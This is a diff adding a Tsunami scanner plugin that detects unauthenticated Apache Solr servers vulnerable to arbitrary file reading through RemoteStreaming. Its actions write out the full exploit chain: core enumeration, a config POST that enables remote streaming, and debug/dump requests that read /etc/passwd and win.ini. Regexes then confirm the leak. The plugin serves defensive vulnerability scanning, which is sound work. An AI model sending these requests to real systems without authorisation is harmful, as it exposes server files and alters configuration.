@@ -1,0 +1,147 @@
+# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ApacheSolrArbitraryFileReadingDetector"
+  author: "C4o (syttcasd@gmail.com)"
+  version: "1.0"
+  description: "Detects unauthenticated Apache Solr instances vulnerable to arbitrary file reading via RemoteStreaming and DumpRequestHandler."
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "APACHE_SOLR_REMOTE_STREAMING_FILE_READING"
+  }
+  severity: HIGH
+  title: "Apache Solr RemoteStreaming Arbitrary File Reading"
+  description: "When Apache Solr service is exposed to untrusted networks and authentication is not enabled, the exposed APIs allow attackers to enable Solr's `RemoteStreaming` service and use this service to perform Server Side Request Forgery (SSRF) and/or Local File Inclusion (LFI) attacks on the system. This is usually done using the following steps:\n\n  1. Enumerating available Solr database names by sending a request to http://[solr_service]/solr/admin/cores?indexInfo=false&wt=json\n  2. Enabling `RemoteStreaming` service for a given database by sending a request to http://[solr_service]/solr/[database]/config with the following json payload `{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}`\n  3. Reading arbitrary file through `stream.url` parameter by sending a request to http://[solr_service]/solr/[database]/debug/dump?param=ContentStreams&stream.url=file://[file_on_system_running_solr].\n\nSee extra details for the exact scanning traffic sent by the scanner and use them to reproduce this vulnerability."
+  recommendation: "Apache Solr is acknowledged by its developers to be insecure and should never be exposed on the Internet per https://cwiki.apache.org/confluence/display/SOLR/SolrSecurity and https://solr.apache.org/guide/8_11/securing-solr.html. It is highly recommended that the Apache Solr service is bound to localhost whenever possible and you **DO NOT** use Apache Solr for handling Confidential or Need-to-Know data."
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "discover_solr_core"
+  action_phase: ACTION_PHASE_FINGERPRINT
+  http_request: {
+    method: GET
+    uri: "/solr/admin/cores?wt=json&indexInfo=false"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"responseHeader\":" },
+          { body: {} contains: "\"status\":" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            variable_name: "core"
+            regexp: "\"status\"\\s*:\\s*\\{\\s*\"([^\"/\\\\?&#\\s]+)\"\\s*:\\s*\\{"
+            from_body: {}
+          }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "enable_remote_streaming"
+  cleanup_actions: [
+    "unset_remote_streaming"
+  ]
+  http_request: {
+    method: POST
+    uri: "/solr/{{ core }}/config"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
+    client_options: {
+      disable_follow_redirects: true
+      ignore_http_client_errors: true
+    }
+  }
+}
+
+actions: {
+  name: "unset_remote_streaming"
+  http_request: {
+    method: POST
+    uri: "/solr/{{ core }}/config"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"unset-property\":\"requestDispatcher.requestParsers.enableRemoteStreaming\"}"
+    client_options: {
+      disable_follow_redirects: true
+      ignore_http_client_errors: true
+    }
+  }
+}
+
+actions: {
+  name: "verify_remote_streaming_file_read"
+  http_request: {
+    method: GET
+    uri: [
+      "/solr/{{ core }}/debug/dump?wt=json&param=ContentStreams&stream.url=file:///etc/passwd",
+      "/solr/{{ core }}/debug/dump?wt=json&param=ContentStreams&stream.url=file:///C:/Windows/win.ini",
+      "/solr/{{ core }}/select?qt=/debug/dump&wt=json&param=ContentStreams&stream.url=file:///etc/passwd",
+      "/solr/{{ core }}/select?qt=/debug/dump&wt=json&param=ContentStreams&stream.url=file:///C:/Windows/win.ini"
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"streams\":[" },
+          { body: {} contains: "\"sourceInfo\":\"url\"" }
+        ]
+      }
+      extract_any: {
+        patterns: [
+          {
+            variable_name: "leaked_file_marker"
+            regexp: "(root:[x*!]:0:0:|nobody:[x*!]:[0-9]+:)"
+            from_body: {}
+          },
+          {
+            variable_name: "leaked_file_marker"
+            regexp: "(\\[(?:fonts|extensions|mci extensions)\\]|for 16-bit app support)"
+            from_body: {}
+          }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "discover_solr_core",
+    "enable_remote_streaming",
+    "verify_remote_streaming_file_read"
+  ]
+}
